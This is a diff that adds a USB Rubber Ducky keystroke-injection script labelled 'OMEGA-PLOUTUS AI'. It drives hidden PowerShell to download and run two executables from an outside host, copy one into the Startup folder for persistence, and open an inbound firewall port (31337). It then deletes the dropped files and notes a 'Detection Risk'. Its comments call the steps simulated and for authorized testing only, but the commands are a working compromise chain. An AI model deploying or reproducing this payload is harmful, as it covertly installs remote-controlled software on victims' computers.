@@ -1,0 +1,90 @@
+REM OMEGA-PLOUTUS AI INTEGRATION - Ducky Script
+REM ===========================================
+REM Ducky Script for OMEGA-PLOUTUS AI deployment
+REM Author: OMEGA-PLOUTUS AI Research Team
+REM Version: 1.0
+
+REM ===========================================
+REM Ducky Script Configuration
+REM ===========================================
+DELAY 3000
+
+REM ===========================================
+REM Windows Key + R (Run Dialog)
+REM ===========================================
+GUI r
+DELAY 500
+
+REM ===========================================
+REM Download and Execute OMEGA AI Server
+REM ===========================================
+STRING powershell -windowstyle hidden -command "Invoke-WebRequest -Uri 'https://omega-ploutus.ai/omega_ai_server.exe' -OutFile '$env:TEMP\omega_ai_server.exe'; Start-Process -FilePath '$env:TEMP\omega_ai_server.exe' -WindowStyle Hidden"
+ENTER
+DELAY 3000
+
+REM ===========================================
+REM Download and Execute OMEGA Launcher
+REM ===========================================
+STRING powershell -windowstyle hidden -command "Invoke-WebRequest -Uri 'https://omega-ploutus.ai/omega_ploutus_launcher.exe' -OutFile '$env:TEMP\omega_ploutus_launcher.exe'; Start-Process -FilePath '$env:TEMP\omega_ploutus_launcher.exe' -WindowStyle Hidden"
+ENTER
+DELAY 3000
+
+REM ===========================================
+REM Create Persistence (Startup Folder)
+REM ===========================================
+STRING powershell -windowstyle hidden -command "Copy-Item -Path '$env:TEMP\omega_ploutus_launcher.exe' -Destination '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\omega_ploutus_launcher.exe' -Force"
+ENTER
+DELAY 2000
+
+REM ===========================================
+REM Configure Firewall Exception
+REM ===========================================
+STRING powershell -windowstyle hidden -command "New-NetFirewallRule -DisplayName 'OMEGA AI Server' -Direction Inbound -LocalPort 31337 -Protocol TCP -Action Allow"
+ENTER
+DELAY 1000
+
+REM ===========================================
+REM Clean Up Temporary Files
+REM ===========================================
+STRING powershell -windowstyle hidden -command "Remove-Item -Path '$env:TEMP\*.exe' -Force -ErrorAction SilentlyContinue"
+ENTER
+DELAY 1000
+
+REM ===========================================
+REM Display Completion Message (Optional)
+REM ===========================================
+REM STRING msg * /time:3 "OMEGA-PLOUTUS AI System Deployed Successfully"
+REM ENTER
+
+REM ===========================================
+REM Ducky Script Variables
+REM ===========================================
+REM OMEGA_AI_PORT: 31337
+REM OMEGA_AI_HOST: 127.0.0.1
+REM OMEGA_VERSION: 1.0-DUCKY
+REM TARGET_SYSTEMS: Windows 7/8/10/11
+
+REM ===========================================
+REM Attack Patterns (Simulated)
+REM ===========================================
+REM Pattern 1: AI Server Deployment
+REM Pattern 2: Launcher Persistence
+REM Pattern 3: Firewall Configuration
+REM Pattern 4: Cleanup Routine
+
+REM ===========================================
+REM Security Notes
+REM ===========================================
+REM - Use only in authorized testing environments
+REM - Simulated deployment patterns for research
+REM - Network traffic is simulated download patterns
+
+REM ===========================================
+REM Ducky Script End
+REM ===========================================
+REM Total Execution Time: ~10 seconds
+REM Memory Usage: Minimal
+REM Network Traffic: Simulated download patterns
+REM Detection Risk: Medium (depends on endpoint protection)
+
+REM ===========================================
